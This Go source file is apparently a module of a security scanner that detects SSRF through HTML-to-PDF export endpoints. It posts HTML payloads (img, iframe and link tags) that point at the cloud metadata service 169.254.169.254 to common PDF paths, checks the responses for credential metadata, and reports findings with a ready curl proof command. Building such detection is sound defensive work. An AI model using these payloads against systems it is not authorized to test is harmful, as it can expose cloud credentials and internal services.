// Package pdfssrf detects Server-Side Request Forgery via HTML-to-PDF
// generation endpoints.
//
// Many web applications offer PDF export (invoices, reports, receipts). When
// these use server-side HTML-to-PDF renderers (wkhtmltopdf, Puppeteer, Prince,
// WeasyPrint), injecting HTML with external references (<img>, <iframe>,
// <link>, <script>) causes the server to fetch attacker-controlled URLs.
//
// This enables SSRF to internal services (cloud metadata, internal APIs),
// local file reads (file:// protocol), and port scanning.
//
// Deep mode only — submits test payloads to common PDF generation endpoints.
package pdfssrf

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
)


func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	},
		scan.Check(finding.CheckWebPDFSSRF, finding.SeverityCritical, finding.ModeDeep),
	)
}
const scannerName = "pdfssrf"

// pdfPaths are common endpoints that accept HTML and return PDF.
var pdfPaths = []struct {
	path        string
	method      string
	contentType string
	bodyKey     string // form field name for HTML content
}{
	{"/api/pdf", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/api/render", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/api/export/pdf", http.MethodPost, "application/x-www-form-urlencoded", "content"},
	{"/api/v1/pdf", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/pdf/generate", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/generate-pdf", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/export/pdf", http.MethodPost, "application/x-www-form-urlencoded", "content"},
	{"/invoice/pdf", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/report/pdf", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/receipt/pdf", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/print", http.MethodPost, "application/x-www-form-urlencoded", "html"},
	{"/convert", http.MethodPost, "application/x-www-form-urlencoded", "html"},
}

// canaryToken is a unique marker we embed in SSRF payloads. If the PDF renderer
// fetches external resources, the rendered PDF or error response may contain traces.
const canaryToken = "beacon-pdfssrf-canary-7f3a9b2c"

type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 20 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if c := authctx.HTTPClient(ctx); c != nil {
		client = c
	}

	base := schemedetect.Base(ctx, client, asset)
	var findings []finding.Finding

	for _, ep := range pdfPaths {
		if ctx.Err() != nil {
			break
		}

		f := probePDFEndpoint(ctx, client, base, ep.path, ep.method, ep.contentType, ep.bodyKey, asset)
		if f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

// probePDFEndpoint sends HTML payloads with SSRF indicators to a PDF endpoint.
func probePDFEndpoint(ctx context.Context, client *http.Client, base, path, method, contentType, bodyKey, asset string) *finding.Finding {
	url := base + path

	// First check if the endpoint exists with a simple request.
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner)")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	// Accept POST-only endpoints (405) and normal responses.
	if resp.StatusCode == 404 {
		return nil
	}

	// Try multiple payload formats.
	payloads := []struct {
		name    string
		html    string
		format  string // "form", "json", "multipart"
	}{
		{
			name:   "img_ssrf",
			html:   fmt.Sprintf(`<html><body><img src="http://169.254.169.254/latest/meta-data/%s"><p>test</p></body></html>`, canaryToken),
			format: "form",
		},
		{
			name:   "iframe_ssrf",
			html:   fmt.Sprintf(`<html><body><iframe src="http://169.254.169.254/latest/meta-data/"></iframe><!-- %s --></body></html>`, canaryToken),
			format: "form",
		},
		{
			name:   "link_ssrf",
			html:   fmt.Sprintf(`<html><head><link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"></head><body><!-- %s --></body></html>`, canaryToken),
			format: "form",
		},
		{
			name:   "json_payload",
			html:   fmt.Sprintf(`<html><body><img src="http://169.254.169.254/latest/meta-data/%s"></body></html>`, canaryToken),
			format: "json",
		},
		{
			name:   "multipart_payload",
			html:   fmt.Sprintf(`<html><body><img src="http://169.254.169.254/latest/meta-data/%s"></body></html>`, canaryToken),
			format: "multipart",
		},
	}

	for _, p := range payloads {
		if ctx.Err() != nil {
			return nil
		}

		var body io.Reader
		var ct string

		switch p.format {
		case "form":
			body = strings.NewReader(bodyKey + "=" + p.html)
			ct = "application/x-www-form-urlencoded"
		case "json":
			body = strings.NewReader(fmt.Sprintf(`{"%s": %q}`, bodyKey, p.html))
			ct = "application/json"
		case "multipart":
			var buf bytes.Buffer
			w := multipart.NewWriter(&buf)
			_ = w.WriteField(bodyKey, p.html)
			w.Close()
			body = &buf
			ct = w.FormDataContentType()
		}

		req, err := http.NewRequestWithContext(ctx, method, url, body)
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", ct)
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner)")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
		resp.Body.Close()

		// Indicators that the endpoint processed our HTML and attempted rendering:
		// 1. Response is a PDF (Content-Type: application/pdf or %PDF magic bytes)
		// 2. Response mentions metadata endpoint or contains cloud metadata
		// 3. Response is non-404 and accepts our HTML

		isPDF := strings.Contains(resp.Header.Get("Content-Type"), "pdf") ||
			(len(respBody) > 4 && string(respBody[:5]) == "%PDF-")
		hasMetadata := strings.Contains(string(respBody), "ami-id") ||
			strings.Contains(string(respBody), "instance-id") ||
			strings.Contains(string(respBody), "iam/security-credentials")

		if isPDF || hasMetadata {
			severity := finding.SeverityCritical
			title := fmt.Sprintf("PDF generation endpoint %s accepts HTML with external references", path)
			desc := fmt.Sprintf(
				"The endpoint %s on %s accepts HTML input and renders it to PDF. "+
					"The HTML payload contained references to the cloud metadata service "+
					"(169.254.169.254). ", path, asset)

			if hasMetadata {
				desc += "The response contained cloud instance metadata, confirming SSRF. "
			} else {
				desc += "The server returned a PDF, indicating it processed the HTML — external resource fetching is likely. "
				severity = finding.SeverityHigh
			}
			desc += "An attacker can use this to read internal service responses, access cloud credentials, or scan internal networks."

			return &finding.Finding{
				CheckID:     finding.CheckWebPDFSSRF,
				Module:      "deep",
				Scanner:     scannerName,
				Severity:    severity,
				Title:       title,
				Description: desc,
				Asset:       asset,
				ProofCommand: fmt.Sprintf(
					`curl -s -X POST '%s%s' -d '%s=<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>' -o /dev/null -w '%%{content_type}'`,
					base, path, bodyKey),
				Evidence: map[string]any{
					"endpoint":       path,
					"payload":        p.name,
					"is_pdf":         isPDF,
					"has_metadata":   hasMetadata,
					"response_code":  resp.StatusCode,
					"content_type":   resp.Header.Get("Content-Type"),
				},
				DiscoveredAt: time.Now(),
			}
		}
	}

	return nil
}
